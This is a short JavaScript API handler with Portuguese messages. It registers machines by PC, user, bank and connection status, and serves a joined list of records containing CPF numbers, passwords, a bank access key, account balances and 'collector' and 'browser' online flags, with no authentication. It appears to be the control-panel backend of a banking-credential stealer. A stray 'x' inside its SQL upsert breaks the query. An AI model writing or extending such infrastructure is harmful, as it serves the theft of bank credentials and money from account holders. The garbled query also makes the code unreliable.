const { sequelize } = require('../../models');

export default async function handler(req, res) {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  res.setHeader('Surrogate-Control', 'no-store');

  if (req.method === 'POST') {
    const { PC, USER, BANCO, CONECTADO, STATUSRESUMO } = req.body;

    if (!PC || !USER || !BANCO || !CONECTADO || !STATUSRESUMO) {
      return res.status(400).json({ message: 'Todos os campos são obrigatórios' });
    }

    try {
      const insertOrUpdateQuery = `
        INSERT INTO NFCT (PC, USER, BANCO, CONECTADO, STATUSRESUMO)
        VALUES (:PC, :USER, :BANCO, :CONECTADO, :STATUSRESUMO)
        ON DUPLICATE KEY UPDATE
x
          STATUSRESUMO = VALUES(STATUSRESUMO);
      `;
      await sequelize.query(insertOrUpdateQuery, {
        replacements: { PC, USER, BANCO, CONECTADO, STATUSRESUMO },
        type: sequelize.QueryTypes.INSERT
      });

      res.status(200).json({ message: 'Registro atualizado com sucesso' });
    } catch (error) {
      console.error('Erro ao criar/verificar NFCT:', error.message, req.body);
      res.status(500).json({ error: error.message });
    }
  } else if (req.method === 'GET') {
    try {
      const fetchQuery = `
        SELECT 
          NFCT.ID,
          NFCT.PC,
          NFCT.USER,
          NFCT.BANCO,
          B_BB.PERFIL,
          B_BB.TIPOACESSO,
          B_BB.CHAVEJ,
          B_BB.CPF,
          B_BB.SENHA,
          B_BB.DT_INCLUSAO,
          B_BB.SALDO,
          B_BB.TOTAL,
          B_BB.DT_COLLECTOR,
          B_BB.DT_BROWSER,
          NFCT.STATUSRESUMO,
          (TIMESTAMPDIFF(SECOND, B_BB.DT_COLLECTOR, NOW()) < 4) AS IS_COLLECTOR_ONLINE,
          (TIMESTAMPDIFF(SECOND, B_BB.DT_BROWSER, NOW()) < 4) AS IS_BROWSER_ONLINE
        FROM 
          B_BB
        INNER JOIN 
          NFCT ON B_BB.FK_ID_NFCT = NFCT.id
        WHERE 
          B_BB.id IN (SELECT MAX(id) FROM B_BB GROUP BY FK_ID_NFCT)
      `;
      const data = await sequelize.query(fetchQuery, {
        type: sequelize.QueryTypes.SELECT
      });

      res.status(200).json(data);
    } catch (error) {
      console.error('Erro ao buscar registros:', error.message);
      res.status(500).json({ error: error.message });
    }
  } else {
    res.status(405).json({ message: 'Method not allowed' });
  }
}
